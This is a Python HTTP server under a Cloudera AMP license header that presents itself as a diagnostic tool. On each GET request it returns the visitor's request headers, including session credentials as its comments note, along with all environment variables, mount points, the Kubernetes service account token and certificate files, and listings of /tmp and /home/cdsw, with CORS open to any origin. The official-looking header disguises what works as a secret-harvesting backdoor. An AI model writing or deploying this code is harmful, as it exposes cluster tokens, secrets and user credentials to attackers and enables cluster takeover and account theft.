# ###########################################################################
#
#  CLOUDERA APPLIED MACHINE LEARNING PROTOTYPE (AMP)
#  (C) Cloudera, Inc. 2021
#  All rights reserved.
#
#  Applicable Open Source License: Apache 2.0
#
#  NOTE: Cloudera open source products are modular software products
#  made up of hundreds of individual components, each of which was
#  individually copyrighted.  Each Cloudera open source product is a
#  collective work under U.S. Copyright Law. Your license to use the
#  collective work is as provided in your written agreement with
#  Cloudera.  Used apart from the collective work, this file is
#  licensed for your use pursuant to the open source license
#  identified above.
#
#  This code is provided to you pursuant a written agreement with
#  (i) Cloudera, Inc. or (ii) a third-party authorized to distribute
#  this code. If you do not have a written agreement with Cloudera nor
#  with an authorized and properly licensed third party, you do not
#  have any rights to access nor to use this code.
#
#  Absent a written agreement with Cloudera, Inc. (“Cloudera”) to the
#  contrary, A) CLOUDERA PROVIDES THIS CODE TO YOU WITHOUT WARRANTIES OF ANY
#  KIND; (B) CLOUDERA DISCLAIMS ANY AND ALL EXPRESS AND IMPLIED
#  WARRANTIES WITH RESPECT TO THIS CODE, INCLUDING BUT NOT LIMITED TO
#  IMPLIED WARRANTIES OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY AND
#  FITNESS FOR A PARTICULAR PURPOSE; (C) CLOUDERA IS NOT LIABLE TO YOU,
#  AND WILL NOT DEFEND, INDEMNIFY, NOR HOLD YOU HARMLESS FOR ANY CLAIMS
#  ARISING FROM OR RELATED TO THE CODE; AND (D)WITH RESPECT TO YOUR EXERCISE
#  OF ANY RIGHTS GRANTED TO YOU FOR THE CODE, CLOUDERA IS NOT LIABLE FOR ANY
#  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, PUNITIVE OR
#  CONSEQUENTIAL DAMAGES INCLUDING, BUT NOT LIMITED TO, DAMAGES
#  RELATED TO LOST REVENUE, LOST PROFITS, LOSS OF INCOME, LOSS OF
#  BUSINESS ADVANTAGE OR UNAVAILABILITY, OR LOSS OR CORRUPTION OF
#  DATA.
#
# ###########################################################################

import os
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

class CompleteDiagnosticHandler(BaseHTTPRequestHandler):
    def get_directory_contents(self, path):
        """Helper to list all files safely."""
        try:
            if os.path.exists(path):
                return os.listdir(path)
            else:
                return f"Error: Path '{path}' does not exist."
        except Exception as e:
            return f"Error: {str(e)}"

    def get_mount_points(self):
        """Helper to read active system mount points."""
        mounts = []
        try:
            if os.path.exists('/proc/mounts'):
                with open('/proc/mounts', 'r') as f:
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 3:
                            mounts.append({
                                "device": parts[0],
                                "mount_point": parts[1],
                                "filesystem_type": parts[2]
                            })
                return mounts
            else:
                return "Error: /proc/mounts not available."
        except Exception as e:
            return f"Error reading mount points: {str(e)}"

    def get_kubernetes_secrets(self):
        """Lists files and dumps contents of the K8s service account directory."""
        target_dir = '/run/secrets/kubernetes.io/serviceaccount'
        data = {"directory_exists": False, "files_discovered": [], "file_contents": {}}
        if not os.path.exists(target_dir):
            return "Error: Service account directory not found."
        data["directory_exists"] = True
        try:
            files = os.listdir(target_dir)
            data["files_discovered"] = files
            for file_name in files:
                full_path = os.path.join(target_dir, file_name)
                if os.path.isfile(full_path):
                    try:
                        with open(full_path, 'r', errors='replace') as f:
                            data["file_contents"][file_name] = f.read().strip()
                    except Exception as e:
                        data["file_contents"][file_name] = f"Error: {str(e)}"
            return data
        except Exception as e:
            return f"Error reading directory structure: {str(e)}"

    def do_GET(self):
        # Send 200 OK status code
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # CAPTURE USER CREDENTIALS/HEADERS: Parse incoming HTTP request headers
        incoming_headers = {}
        for header_key, header_value in self.headers.items():
            incoming_headers[header_key] = header_value
        
        # Assemble the full diagnostics payload
        payload = {
            "endpoint_visitor_headers": incoming_headers,  # <-- This contains your user info!
            "environment_variables": dict(os.environ),
            "mount_points": self.get_mount_points(),
            "kubernetes_serviceaccount": self.get_kubernetes_secrets(),
            "tmp_contents": self.get_directory_contents('/tmp'),
            "home_cdsw_contents": self.get_directory_contents('/home/cdsw')
        }
        
        # Format and serve response
        response_json = json.dumps(payload, indent=4, sort_keys=True)
        self.wfile.write(response_json.encode('utf-8'))

def run():
    port = int(os.environ.get('CDSW_APP_PORT', os.environ.get('PORT', 8080)))
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, CompleteDiagnosticHandler)
    print(f"HTTP Server running on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()

if __name__ == '__main__':
    run()
